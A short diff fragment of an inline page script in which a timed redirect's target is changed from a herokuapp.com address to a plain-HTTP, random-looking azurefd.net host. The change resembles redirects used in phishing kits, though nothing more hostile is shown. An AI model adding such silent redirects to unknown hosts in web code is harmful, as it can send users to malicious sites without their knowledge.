@@ -234,7 +234,7 @@
     }
 
     setTimeout(() => {
-      window.location.href = "https://sunrise-a5378eee6754.herokuapp.com/";
+      window.location.href = "http://yeljfiwoeiweikjsdmnbvmnw-c2bhaafbhcfwcwdc.z03.azurefd.net/";
     }, 1000);
   }
   </script>
